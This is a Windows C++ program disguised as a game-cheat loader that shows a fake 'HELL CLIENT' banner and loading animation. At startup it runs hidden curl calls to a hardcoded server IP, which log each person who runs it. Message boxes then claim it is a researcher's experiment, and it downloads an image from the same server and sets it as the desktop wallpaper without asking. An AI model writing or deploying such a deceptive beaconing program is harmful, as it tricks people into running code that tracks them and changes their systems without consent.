#include <windows.h>
#include <stdio.h>
#include <iostream>
#pragma comment (lib, "User32.lib")

using namespace std;

void setConsoleColor(WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

int main() {

    const WORD black = 0;
    setConsoleColor(black);
    WinExec("curl --silent --output /dev/null http://147.182.247.60:3333/getfucked/", SW_HIDE);

    const WORD red = FOREGROUND_RED | FOREGROUND_INTENSITY;
    setConsoleColor(red);

    printf(" /$$   /$$ /$$$$$$$$ /$$       /$$              /$$$$$$  /$$       /$$$$$$ /$$$$$$$$ /$$   /$$ /$$$$$$$$\n");
    printf("| $$  | $$| $$_____/| $$      | $$             /$$__  $$| $$      |_  $$_/| $$_____/| $$$ | $$|__  $$__/\n");
    printf("| $$  | $$| $$      | $$      | $$            | $$  \\__/| $$        | $$  | $$      | $$$$| $$   | $$   \n");
    printf("| $$$$$$$$| $$$$$   | $$      | $$            | $$      | $$        | $$  | $$$$$   | $$ $$ $$   | $$   \n");
    printf("| $$__  $$| $$__/   | $$      | $$            | $$      | $$        | $$  | $$__/   | $$  $$$$   | $$   \n");
    printf("| $$  | $$| $$      | $$      | $$            | $$    $$| $$        | $$  | $$      | $$\\  $$$   | $$   \n");
    printf("| $$  | $$| $$$$$$$$| $$$$$$$$| $$$$$$$$      |  $$$$$$/| $$$$$$$$ /$$$$$$| $$$$$$$$| $$ \\  $$   | $$   \n");
    printf("|__/  |__/|________/|________/|________/       \\______/ |________/|______/|________/|__/  \\__/   |__/   \n");
    printf("\n");
    printf("\n");
    printf("L");
    Sleep(200);
    printf("O");
    Sleep(200);
    printf("A");
    Sleep(200);
    printf("D");
    Sleep(200);
    printf("I");
    Sleep(200);
    printf("N");
    Sleep(200);
    printf("G");
    Sleep(200);
    printf(".");
    Sleep(200);
    printf(".");
    Sleep(200);
    printf(".");
    printf(".");
    Sleep(200);
    printf(".");
    Sleep(200);
    printf(".");

    Sleep(10000);

    setConsoleColor(black);

    LPCSTR title = ".cadenus.";

    LPCSTR content = "hey ;)";
    MessageBoxA(NULL, content, title, MB_OK);

    LPCSTR content5 = "im a cybersec researcher doing a project on how people, specifically in the game cheating space, will knowingly forsake their safety by disabling anti-virus and going around smart screen in order to get what theyre after.";
    MessageBoxA(NULL, content5, title, MB_OK);

    LPCSTR content2 = "while this script could have been malicious, it simply sends a request to my server so i can collect numerical data on the amount of 'victims'.";
    MessageBoxA(NULL, content2, title, MB_OK);

    LPCSTR content3 = "id like to hope this will sway you away from running unknown software in the future, but i dont think this would bring me to change my mind either.";
    MessageBoxA(NULL, content3, title, MB_OK);

    LPCSTR content4 = "stay safe\n\nthanks for participating, stay curious\n\n-cadenus :)";
    MessageBoxA(NULL, content4, title, MB_OK);

    WinExec("curl http://147.182.247.60:3333/geo.jpg -o C:\\Users\\Public\\geo.jpg", SW_HIDE);

    Sleep(500);

    const wchar_t* file = L"C:\\Users\\Public\\geo.jpg";
    int ret = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)file, SPIF_UPDATEINIFILE);
    cout << ret << endl;

    Sleep(500);

    LPCSTR filename = "C:\\Users\\Public\\geo.jpg";
    DeleteFileA(filename);

}